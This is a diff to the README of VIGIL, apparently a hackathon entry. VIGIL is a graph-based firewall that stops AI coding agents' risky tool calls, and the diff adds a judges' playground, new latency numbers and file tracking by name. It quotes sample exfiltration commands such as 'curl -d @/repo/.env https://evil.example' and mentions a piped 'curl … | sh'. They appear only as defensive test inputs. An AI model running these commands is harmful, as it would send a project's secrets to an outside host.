@@ -25,6 +25,17 @@ and autonomy is granted only as far as the graph can prove it is safe.</p>
 > **Name.** VIGIL is the submission name. Two 2026 arXiv papers in this space share it
 > ([Jan 2026](https://www.alphaxiv.org/abs/2601.05755), [Jun 2026](https://www.alphaxiv.org/abs/2606.26524)); this project is unrelated to them.
 
+## For judges: three ways to check it
+
+| | Time | What it shows |
+|---|---|---|
+| **Attack it:** [vigil-playground.onrender.com](https://vigil-playground.onrender.com). Pick an attack or type your own (`curl -d @/repo/.env https://evil.example`) | 30 s | Real verdicts from a real FalkorDB 6.0.2: the subgraph, the `algo.maxFlow` cut and the counterfactual "Why?" for every call. Allowed calls run in a fake tool layer that does no I/O, so nothing real executes |
+| **Run it on your own history:** `vigil-cli reveal`, [below](#try-it-in-60-seconds) | 60 s to start | VIGIL on your real Claude Code, Codex or Gemini CLI logs, locally; nothing is uploaded |
+| **Put it in front of your agent:** the `PreToolUse` hook, [CONNECT_CLAUDE.md](CONNECT_CLAUDE.md) | 5 min | A live Claude Code session stopped before a bad call runs |
+
+The playground runs on Render's free plan: after 15 idle minutes it sleeps, the first request waits for a cold start
+(about a minute), and its counter and feed start again from zero.
+
 ## Try it in 60 seconds
 
 ```bash
@@ -39,11 +50,11 @@ have been blocked and the one path that mattered, drawn hop by hop, your autonom
 already be auto-approved, and what repeated identical calls cost. Nothing leaves your machine; secrets in labels are
 masked.
 
-<p align="center"><img src="docs/img/reveal.png" width="85%" alt="VIGIL reveal: your agent made 22,646 tool calls across 36 sessions"></p>
+<p align="center"><img src="docs/img/reveal.png" width="85%" alt="VIGIL reveal: your agent made 22,458 tool calls across 36 sessions"></p>
 
-On the author's last 30 days of Claude Code history: 22,646 calls in 36 sessions; 68 would have been blocked, 575 would
+On the author's last 30 days of Claude Code history (run on 2026-10-17): 22,458 calls in 36 sessions; 59 would have been blocked, 566 would
 have asked first (Claude Code's normal prompt, because content from outside reached a shell), 8 would have run with an
-argument redacted; autonomy level 20.1%. Typing the command takes a minute; that replay took 11m17s (it slows as the
+argument redacted; autonomy level 19.9%. Typing the command takes a minute; that replay took 11m43s (it slows as the
 graph grows, see [limitations](#10-known-limitations)). `--since 7d` is quicker. With `VIGIL_FALKORDB_URL` set the graph is kept, and `--no-replay` reopens the page without replaying.
 
 **Reveal found a bug in VIGIL.** The first run on that history reported 2,951 calls stopped and 260 rewritten. Most of
@@ -51,7 +62,7 @@ them traced to ordinary words (`expected`, `generated`, `application/json`) that
 secrets from `status: expected` lines in a command's output, so every later command containing the word looked like
 exfiltration. The detector now needs a secret-named key or a credential-shaped value, and ignores plain words and
 public hex identifiers ([`secretValues`](internal/firewall/flow.go), `TestSecretValuesIgnoresOrdinaryValues`). The
-second run reported 999 stopped and 29 rewritten, the third the numbers above. The remaining blocks still deserve a look:
+second run reported 999 stopped and 29 rewritten; later runs, after the window moved and files sent by name were added, the numbers above. The remaining blocks still deserve a look:
 some carry public wallet addresses, which the detector cannot tell from secrets of the same shape.
 
 ## 1. Thesis
@@ -1225,9 +1236,10 @@ real firewall against FalkorDB on the `playground` tenant. The page draws the de
   ([`ObserveAuthority`](internal/firewall/flow.go)) and the `curl … | sh` it suggests is paused.
 - **Hosted mode** (`VIGIL_PLAYGROUND=1`) serves the playground and nothing else: no control API, hook, MCP server or
   OAuth. Inputs are stripped of anything resembling a secret before storage, no visitor identity is stored, and the
-  rate limit is per visitor. Fly.io and Railway configs and the full sandboxing notes are in
-  [deploy/playground](deploy/playground/README.md). Those configs follow each platform's format but have not been
-  deployed from this repository, so there is no public URL to show yet.
+  rate limit is per visitor. It is live at [vigil-playground.onrender.com](https://vigil-playground.onrender.com)
+  (Render free plan, [`deploy/playground/render.yaml`](deploy/playground/render.yaml)): one container running FalkorDB
+  on loopback and the playground. Cloudflare, Fly.io and Railway configs and the full sandboxing notes are in
+  [deploy/playground](deploy/playground/README.md).
 
 <table><tr>
 <td width="50%"><img src="docs/img/playground-before.png" alt="Playground, before the fix: arg url has capacity 2, the cut redacts the token, the call is allowed and rewritten"><br><sub><b>Before the fix</b> (toggle on): the URL argument costs 2 to cut, so the min cut redacts it and the fetch goes nowhere. Safe, but a rewrite where a block was due.</sub></td>
@@ -1253,13 +1265,13 @@ exists, that the full path exists once both hops do, and that no returned edge p
 Every number here is copied from [docs/measurements.md](docs/measurements.md), the raw output of
 [`scripts/measure.py`](scripts/measure.py). It was run against the `docker compose` stack built from a clean clone
 (FalkorDB **6.0.2** in Docker, demo dataset seeded, no LLM credentials) on a Linux x86_64 laptop with 12 CPUs, on
-2026-10-16. The script runs 30 benign developer sessions and the attack beats through the real hook endpoint, then
+2026-10-17. The script runs 30 benign developer sessions and the attack beats through the real hook endpoint, then
 reads the results back from the graph.
 
 | Measured | Result |
 |---|---|
-| Decision latency, `PreToolUse` hook round trip (client-side, localhost) | **p50 3.38 ms, p99 8.48 ms** (399 calls) |
-| Graph time per decision (server-side, `Decision.graph_ms`) | **p50 0.60 ms, p99 2.08 ms** (398 decisions) |
+| Decision latency, `PreToolUse` hook round trip (client-side, localhost) | **p50 3.73 ms, p99 12.95 ms** (399 calls) |
+| Graph time per decision (server-side, `Decision.graph_ms`) | **p50 0.71 ms, p99 2.69 ms** (398 decisions) |
 | Decisions resolved without a model call | **399 of 399**: no model was configured, so this is 100% by construction. The informative number: **0 of 399** would have gone to a model if one were configured |
 | Abstention accuracy (fabricated subjects must return zero rows) | **200 of 200** lookups of 50 fabricated subjects through `facts`, `entity_policy`, `blast_typosquats`, `blast_dependents` returned zero rows; the seeded control subjects returned rows |
 | False-block rate on the benign set | **0 of 390** denied, 0 paused for a human; 270 allowed by earned autonomy, 120 left to the normal prompt |
@@ -1321,6 +1333,7 @@ was added since then:
 | Oct 16 | [`internal/reveal/`](internal/reveal) (Claude Code, Codex, Gemini CLI log readers and the replay), `vigil-cli reveal`, [`internal/web/`](internal/web) (the reveal page and the shared renderer), the secret-detector fix reveal surfaced | `4d410f7` |
 | Oct 16 | [`internal/playground/`](internal/playground) and its no-I/O tool layer [`sim/`](internal/playground/sim), hosted mode, the compose profile, [deploy/playground](deploy/playground) | `ffcba95` |
 | Oct 16 | [`internal/graph/timeline.go`](internal/graph/timeline.go), the as-of queries, `/web/timeline.html` | `9e7be93` |
+| Oct 17 | The playground live on Render ([`deploy/playground/render.yaml`](deploy/playground/render.yaml)) and a Cloudflare Containers config ([deploy/cloudflare](deploy/cloudflare)); files that returned secrets are tracked by path and name ([`fileNames`](internal/firewall/flow.go)), found by trying `curl -d @/repo/.env` on the live playground | `c9376ee`, `fe05e13`, `d49e175` |
 
 ## 9. AI-assistance disclosure
 
@@ -1342,6 +1355,8 @@ them, and docs/DEMO_SCRIPT.md reproduces each beat.
   `filesystem` example in 5.6). It can only raise scrutiny, never grant trust.
 - **Trust is pooled per capability shape.** `git status`, `ls` and `go test` share one count, and one refused shell call
   resets it for all of them.
+- **Files are matched by path and base name.** A file that returned secrets is tracked so `curl -d @.env` is caught, but
+  two files with the same name in different directories count as one, so a network call naming either is blocked.
 - **A literal secret in any shell command is denied**, even a local one. Start in observe mode.
 - **Rug-pull detection needs descriptions.** Claude Code hooks don't carry MCP descriptions; something that sees
   `tools/list` must POST them to `/vigil/tools`.
@@ -1474,8 +1489,8 @@ And unlike most security tools, **VIGIL interrupts you less the longer it runs**
 - **`npx vigil init`** wrapper around `vigil-cli init`.
 - **Per-shape trust counters.** Earned trust is counted by scanning history today, which is why a long replay slows down
   (see limitations); a counter node per agent, repo and call shape, updated on each outcome, makes it constant time.
-- **A hosted playground URL.** The Fly.io and Railway configs are in [deploy/playground](deploy/playground); it has not
-  been deployed yet.
+- **A playground that keeps its counter.** The hosted graph lives in the container and starts empty after the free
+  plan's idle sleep; a FalkorDB volume (any paid plan) keeps it.
 - **A tool-description feed.** Claude Code hooks don't carry MCP descriptions; a gateway would post `tools/list` to `/vigil/tools`.
 
 ## Author
